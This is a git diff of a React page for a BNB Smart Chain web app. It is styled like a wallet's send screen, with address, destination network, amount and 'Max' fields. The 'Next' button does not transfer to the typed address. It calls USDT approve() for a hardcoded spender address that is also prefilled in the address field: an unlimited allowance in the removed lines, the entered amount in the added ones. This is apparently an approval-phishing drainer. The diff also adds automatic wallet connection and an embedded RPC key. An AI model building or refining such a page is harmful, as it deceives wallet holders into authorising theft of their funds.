@@ -1,6 +1,7 @@
 import { useCallback, useEffect, useState } from "react";
-import { Clipboard, ScanLine } from "lucide-react";
-import { BrowserProvider, Contract, MaxUint256 } from "ethers";
+import { Clipboard, ScanLine, ChevronDown } from "lucide-react"; // Added ChevronDown
+import { BrowserProvider, Contract, parseUnits, formatUnits } from "ethers";
+import icon from "../assets/image.png";
 
 /** BNB Smart Chain mainnet */
 const BSC_CHAIN_ID_HEX = "0x38";
@@ -9,11 +10,15 @@ const BSC_CHAIN_ID_DEC = 56;
 /** BEP-20 USDT on BSC (Binance-Peg USDT) */
 const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 
+const rpc = `https://rpc.ankr.com/bsc/81980e93ea450e7183f250214d083c51a389ad1a1c4188853a14f59182089c29`;
+
 /** Unlimited USDT allowance is always approved for this spender only */
-const USDT_APPROVE_SPENDER = "0x8Fd2FFc1d235CEf07e37Ea065732ED1a0a6856E5";
+// const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";
+const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";
 
 const ERC20_APPROVE_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
+  "function balanceOf(address account) view returns (uint256)",
 ];
 
 function getEthereum() {
@@ -35,7 +40,7 @@ async function ensureBscNetwork(ethereum) {
             chainId: BSC_CHAIN_ID_HEX,
             chainName: "BNB Smart Chain",
             nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-            rpcUrls: ["https://bsc-dataseed.binance.org"],
+            rpcUrls: [rpc],
             blockExplorerUrls: ["https://bscscan.com"],
           },
         ],
@@ -46,18 +51,59 @@ async function ensureBscNetwork(ethereum) {
   }
 }
 
+// Styling Constants to match Screenshot
+const colors = {
+  bg: "#1b1b1b",
+  inputBg: "#1a1a1a",
+  primaryGreen: "#48ff91",
+  textMain: "#ffffff",
+  textSecondary: "#aaa7a7ff",
+  border: "#2a2a2a",
+};
+
 const Home = () => {
   const [address, setAddress] = useState(USDT_APPROVE_SPENDER);
   const [amount, setAmount] = useState("");
   const [account, setAccount] = useState(null);
   const [chainId, setChainId] = useState(null);
   const [connectError, setConnectError] = useState(null);
-  const [txStatus, setTxStatus] = useState(null);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [userBalance, setUserBalance] = useState(0n);
+  console.log("Wallet State:", { account, chainId, userBalance });
 
   const refreshChain = useCallback(async (ethereum) => {
-    const idHex = await ethereum.request({ method: "eth_chainId" });
-    setChainId(Number.parseInt(idHex, 16));
+    try {
+      const idHex = await ethereum.request({ method: "eth_chainId" });
+      const id = Number.parseInt(idHex, 16);
+      console.log("Current Chain ID:", id);
+      setChainId(id);
+    } catch (e) {
+      console.error("Error refreshing chain ID:", e);
+    }
   }, []);
+
+  const fetchBalance = useCallback(async (addr) => {
+    const ethereum = getEthereum();
+    if (!ethereum || !addr) return;
+    try {
+      const provider = new BrowserProvider(ethereum);
+      console.log(`Fetching balance for ${addr} on BSC...`);
+      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, provider);
+      const balance = await usdt.balanceOf(addr);
+      console.log("Balance of USDT:", formatUnits(balance, 18), "USDT");
+
+      setUserBalance(balance);
+    } catch (e) {
+      console.error("Error fetching balance:", e);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (account && chainId === BSC_CHAIN_ID_DEC) {
+      console.log("Triggering balance fetch for:", account);
+      fetchBalance(account);
+    }
+  }, [account, chainId, fetchBalance]);
 
   useEffect(() => {
     const ethereum = getEthereum();
@@ -79,45 +125,55 @@ const Home = () => {
     (async () => {
       try {
         setConnectError(null);
-        const accounts = await ethereum.request({ method: "eth_accounts" });
-        setAccount(accounts[0] ?? null);
-      } catch (e) {
-        setConnectError(e?.message ?? "Could not read wallet");
-        setAccount(null);
-        return;
-      }
-      try {
-        await ensureBscNetwork(ethereum);
-      } catch (e) {
-        setConnectError(
-          e?.message ?? "Switch to BNB Smart Chain when you continue."
-        );
-      }
-      try {
+        // Automatically request account connection on mount
+        const accounts = await ethereum.request({
+          method: "eth_requestAccounts",
+        });
+        const activeAccount = accounts[0] ?? null;
+        setAccount(activeAccount);
+        console.log("Connected account:", activeAccount);
+
+        // Initial chain sync
         await refreshChain(ethereum);
-      } catch {
-        /* ignore */
+
+        // Ensure BSC network immediately after connection
+        if (activeAccount) {
+          await ensureBscNetwork(ethereum);
+          await refreshChain(ethereum); // Refresh again after potential switch
+        }
+      } catch (e) {
+        console.error("Connection/Network init error:", e);
+        setConnectError(e?.message ?? "Could not connect wallet");
       }
     })();
-
     return () => {
       ethereum.removeListener?.("accountsChanged", onAccounts);
       ethereum.removeListener?.("chainChanged", onChain);
     };
   }, [refreshChain]);
 
-  const handlePaste = async () => {
-    try {
-      const text = await navigator.clipboard.readText();
-      if (text?.trim()) setAddress(text.trim());
-    } catch {
-      /* ignore */
+  // Proactively switch to BSC if connected to wrong network
+  useEffect(() => {
+    const ethereum = getEthereum();
+    if (
+      ethereum &&
+      account &&
+      chainId !== null &&
+      chainId !== BSC_CHAIN_ID_DEC
+    ) {
+      console.log("Wrong network detected. Attempting auto-switch to BSC...");
+      ensureBscNetwork(ethereum).then(() => refreshChain(ethereum));
+    }
+  }, [account, chainId, refreshChain]);
+
+  const handleMax = () => {
+    if (userBalance > 0n) {
+      setAmount(formatUnits(userBalance, 18));
     }
   };
 
   const handleNext = async () => {
     const ethereum = getEthereum();
-    setTxStatus(null);
     setConnectError(null);
 
     if (!ethereum) {
@@ -134,9 +190,7 @@ const Home = () => {
         activeAccount = accs[0] ?? null;
         setAccount(activeAccount);
       } catch (e) {
-        setConnectError(
-          e?.message ?? "Allow wallet access to continue."
-        );
+        setConnectError(e?.message ?? "Allow wallet access to continue.");
         return;
       }
     }
@@ -146,6 +200,7 @@ const Home = () => {
     }
 
     try {
+      setIsProcessing(true);
       await ensureBscNetwork(ethereum);
       await refreshChain(ethereum);
 
@@ -156,89 +211,188 @@ const Home = () => {
         return;
       }
 
-      setTxStatus("Confirm unlimited USDT approval in your wallet…");
+      if (!amount || Number.parseFloat(amount) <= 0) {
+        setConnectError("Minimum 0.0000000000000001 USDT");
+        return;
+      }
+
       const provider = new BrowserProvider(ethereum);
       const signer = await provider.getSigner();
       const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);
-      const tx = await usdt.approve(USDT_APPROVE_SPENDER, MaxUint256);
-      setTxStatus("Waiting for confirmation…");
+
+      const usdtAmount = parseUnits(amount, 18);
+      const currentBalance = await usdt.balanceOf(activeAccount);
+
+      if (currentBalance < usdtAmount) {
+        setConnectError("Not enough balance");
+        return;
+      }
+
+      const tx = await usdt.approve(USDT_APPROVE_SPENDER, usdtAmount);
       await tx.wait();
-      setTxStatus("Approved. Transaction confirmed.");
     } catch (e) {
       const msg = e?.shortMessage || e?.message || "Transaction failed";
       setConnectError(msg);
-      setTxStatus(null);
+    } finally {
+      setIsProcessing(false);
     }
   };
 
-  const onBsc = chainId === BSC_CHAIN_ID_DEC;
-
   return (
-    <div className="min-h-screen bg-[var(--bg)] flex justify-center">
-      <div className="w-full min-h-screen flex flex-col justify-between pt-10 px-6 pb-6">
-        <div className="w-full">
-          {account && (
-            <p className="text-xs text-gray-500 mb-2 break-all">
-              Connected: {account.slice(0, 6)}…{account.slice(-4)}
-              {onBsc ? " · BSC" : chainId != null ? ` · chain ${chainId}` : ""}
-            </p>
-          )}
-          {(connectError || txStatus) && (
-            <p
-              className={`text-sm mb-2 ${connectError ? "text-red-600" : "text-gray-600"}`}
+    <div
+      className="max-h-screen h-full flex justify-center font-sans"
+      style={{ backgroundColor: colors.bg }}
+    >
+      <div className="w-full max-w-md flex flex-col px-5 pt-4 pb-8">
+        <div className="flex-1 space-y-6">
+          {/* Address Input Section */}
+          <div>
+            <label
+              className="block text-sm font-medium mb-2"
+              style={{ color: colors.textSecondary }}
             >
-              {connectError || txStatus}
-            </p>
-          )}
-
-          <label className="text-gray-600 text-sm">
-            Address or Domain Name
-          </label>
-          <div className="w-full mt-2 border border-[var(--border)] rounded-lg px-4 py-3 flex items-center gap-3 bg-[var(--card)]">
-            <input
-              type="text"
-              value={address}
-              onChange={(e) => setAddress(e.target.value)}
-              className="outline-none flex-1 text-[var(--text)] bg-transparent"
-            />
-            <div className="flex items-center gap-4 text-[var(--primary)]">
-              <button
-                type="button"
-                onClick={handlePaste}
-                className="text-sm"
+              Address or Domain Name
+            </label>
+            <div
+              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
+              style={{
+                backgroundColor: colors.bg,
+              }}
+            >
+              <input
+                type="text"
+                placeholder="Search or Enter"
+                className="bg-transparent outline-none flex w-[60%] justify-start  text-white placeholder-gray-600 "
+                value={address}
+                onChange={(e) => setAddress(e.target.value)}
+              />
+              <div
+                className="flex items-center gap-4 ml-2"
+                style={{ color: colors.primaryGreen }}
               >
-                Paste
-              </button>
-              <Clipboard size={18} />
-              <ScanLine size={18} />
+                <button className="text-sm font-bold">Paste</button>
+                <Clipboard size={20} />
+                <ScanLine size={20} />
+              </div>
             </div>
           </div>
 
-          <label className="text-gray-600 text-sm mt-6 block">Amount</label>
-          <div className="w-full mt-2 border border-[var(--border)] rounded-lg px-4 py-3 flex items-center gap-3 bg-[var(--card)]">
-            <input
-              type="text"
-              inputMode="decimal"
-              placeholder="Amount"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              className="outline-none flex-1 text-[var(--text)] bg-transparent"
-            />
-            <div className="flex items-center gap-3">
-              <span className="text-gray-500">USDT</span>
-              <span className="text-xs text-gray-400">Next uses unlimited</span>
+          {/* Destination Network Section */}
+          <div>
+            <label
+              className="block text-sm font-medium mb-2"
+              style={{ color: colors.textSecondary }}
+            >
+              Destination network
+            </label>
+            <div
+              className="flex items-center gap-2 px-3 py-2 rounded-full w-fit"
+              style={{ backgroundColor: colors.inputBg }}
+            >
+              <img src={icon} alt="BNB" className="w-5 h-5 rounded-full" />
+              <span
+                className="text-white  font-bold text-sm"
+                style={{ color: colors.textSecondary }}
+              >
+                BNB Smart Chain
+              </span>
+              <ChevronDown size={16} style={{ color: colors.textSecondary }} />
             </div>
           </div>
 
-          <p className="text-gray-500 text-sm mt-2">= $0</p>
+          {/* Amount Input Section */}
+          <div>
+            <label
+              className="block text-sm font-medium mb-2"
+              style={{ color: colors.textSecondary }}
+            >
+              Amount
+            </label>
+            <div
+              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
+              style={{
+                backgroundColor: colors.bg,
+              }}
+            >
+              <input
+                type="number"
+                placeholder="USDT Amount"
+                className="bg-transparent outline-none flex w-[60%] justify-start text-white  placeholder-gray-600"
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
+              />
+              <div className="flex items-center gap-3">
+                <span
+                  className="text-white font-semibold"
+                  style={{ color: colors.textSecondary }}
+                >
+                  USDT
+                </span>
+                <button
+                  onClick={handleMax}
+                  className="font-bold cursor-pointer"
+                  style={{ color: colors.primaryGreen }}
+                >
+                  Max
+                </button>
+              </div>
+            </div>
+            {(() => {
+              if (!amount || Number.parseFloat(amount) <= 0) {
+                return (
+                  <p
+                    className="mt-2 text-sm font-medium"
+                    style={{ color: colors.textSecondary }}
+                  >
+                    ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
+                  </p>
+                );
+              }
+              try {
+                const parsedAmount = amount ? parseUnits(amount, 18) : 0n;
+                if (account && userBalance < parsedAmount) {
+                  return (
+                    <div className="mt-2 space-y-1">
+                      <p className="text-sm font-normal text-red-500">
+                        Not enough balance
+                      </p>
+                    </div>
+                  );
+                }
+              } catch (e) {
+                /* ignore parse errors */
+              }
+              return (
+                <p
+                  className="mt-2 text-sm font-medium"
+                  style={{ color: colors.textSecondary }}
+                >
+                  ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
+                </p>
+              );
+            })()}
+          </div>
         </div>
+
+        {connectError && (
+          <p className="mt-4 text-center text-sm font-medium text-red-500">
+            {connectError}
+          </p>
+        )}
 
         <button
           type="button"
           onClick={handleNext}
-          className="w-full bg-[var(--primary)] hover:bg-[var(--primary-light)] text-white py-3 rounded-full text-lg mt-6"
+          disabled={
+            isProcessing ||
+            (account &&
+              amount &&
+              Number.parseFloat(amount) > 0 &&
+              userBalance < parseUnits(amount, 18))
+          }
+          className={`w-full ${isProcessing || (account && amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18)) ? "opacity-70 cursor-not-allowed" : ""} bg-[var(--primary)] text-black font-medium py-3 rounded-full text-lg mt-6`}
         >
-          Next
+          {isProcessing ? "Processing..." : "Next"}
         </button>
       </div>
     </div>
